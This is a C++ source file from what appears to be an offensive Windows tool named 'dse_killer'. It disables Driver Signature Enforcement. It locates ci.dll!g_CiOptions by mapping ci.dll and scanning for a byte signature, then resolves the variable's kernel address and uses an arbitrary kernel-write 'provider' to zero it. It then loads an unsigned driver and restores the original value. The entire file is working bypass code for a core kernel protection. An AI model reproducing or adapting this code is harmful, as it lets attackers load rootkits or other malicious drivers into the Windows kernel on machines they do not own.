#include "dse_killer.h"

void dse_killer::load_unsigned_driver(provider* provider, path driverPath)
{
	uintptr_t pgCiOptionsRva = get_g_cioptions_rva();
	Log("g_CiOptions RVA = 0x%llX", pgCiOptionsRva);

	uintptr_t kernelCiImageBaseVa = get_ci_image_base_in_kernel();
	Log("The kernel image base VA CI.dll 0x%016llX", kernelCiImageBaseVa);

	uintptr_t pgCiOptionsKernelVa = kernelCiImageBaseVa + pgCiOptionsRva;
	Log("g_CiOptions kernel VA 0x%016llX", pgCiOptionsKernelVa);

	provider->init();
	char oldValue = 0, newValue = 0;
	provider->write_kernel_virtualmemory(pgCiOptionsKernelVa, &newValue, sizeof(newValue), &oldValue);
	LogSuccess("Successfully set value 0x%X -> 0x%X for 0x%016llX(ci.dll!g_CiOptions)", oldValue, newValue, pgCiOptionsKernelVa);
	load_driver(driverPath);
	provider->write_kernel_virtualmemory(pgCiOptionsKernelVa, &oldValue, sizeof(oldValue));
	LogSuccess("Successfully set value 0x%X -> 0x%X for 0x%016llX(ci.dll!g_CiOptions)", newValue, oldValue, pgCiOptionsKernelVa);
	provider->release();
	unload_driver(driverPath);
}

uintptr_t dse_killer::get_ci_image_base_in_kernel()
{
	ULONG size{ 0 };
	NTSTATUS ntstatus = NtQuerySystemInformation(SystemModuleInformation, nullptr, 0, &size);

	PRTL_PROCESS_MODULES pProcessModules = (PRTL_PROCESS_MODULES)VirtualAlloc(nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	ntstatus = NtQuerySystemInformation(SystemModuleInformation, pProcessModules, size, nullptr);
	CheckNtStatus(ntstatus);
	
	PRTL_PROCESS_MODULE_INFORMATION pModuleInfo = &pProcessModules->Modules[0];

	for (size_t i = 0; i < pProcessModules->NumberOfModules; i++, pModuleInfo++)
	{
		PCHAR szModuleName = (PCHAR)pModuleInfo->FullPathName + pModuleInfo->OffsetToFileName;

		if (memcmp(szModuleName, "CI.dll", 6) != 0)
			continue;
		
		uintptr_t ret = (uintptr_t)pModuleInfo->ImageBase;
		VirtualFree(pProcessModules, 0, MEM_RELEASE);
		return ret;
	}
	
	return 0;
}

// Get RVA g_CiOptions in ring3
uintptr_t dse_killer::get_g_cioptions_rva()
{
	uintptr_t pCiImageBaseVA = map_ci_into_memory();
	uintptr_t pMovCiOptionsToEax = scanner::sig_scan_section("PAGE", (PIMAGE_DOS_HEADER)pCiImageBaseVA, SIG_CI_OPTIONS, sizeof(SIG_CI_OPTIONS));
	if (!pMovCiOptionsToEax)
		LogError("dse_killer::get_g_cioptions_rva sig_scan_section error!");
	DebugLog("VA(ring3) = 0x%016llX (mov eax, g_CiOptions)", pMovCiOptionsToEax);
	uintptr_t va = pMovCiOptionsToEax + 6 + *(__int32*)(pMovCiOptionsToEax + 2);
	return va - pCiImageBaseVA;
}

uintptr_t dse_killer::map_ci_into_memory()
{
	path fPath = get_system32_drivers_path().parent_path() / "ci.dll";

	HANDLE hFile = CreateFileW(fPath.c_str(),
		GENERIC_READ, 
		0, 
		nullptr, 
		OPEN_EXISTING, 
		0, 
		nullptr);
	CheckHandleEx(hFile, "%ls", fPath.c_str());

	HANDLE hSection = CreateFileMappingA(hFile,
		nullptr, 
		PAGE_READONLY | SEC_IMAGE, 
		0, 
		0, 
		nullptr);
	CheckHandle(hSection);

	PVOID pFileMap = MapViewOfFile(hSection, FILE_MAP_READ, 0, 0, 0);

	CloseHandle(hSection);
	CloseHandle(hFile);

	DebugLog("CI.dll is successfully mapped! => 0x%p", pFileMap);
	return (uintptr_t)pFileMap;
}
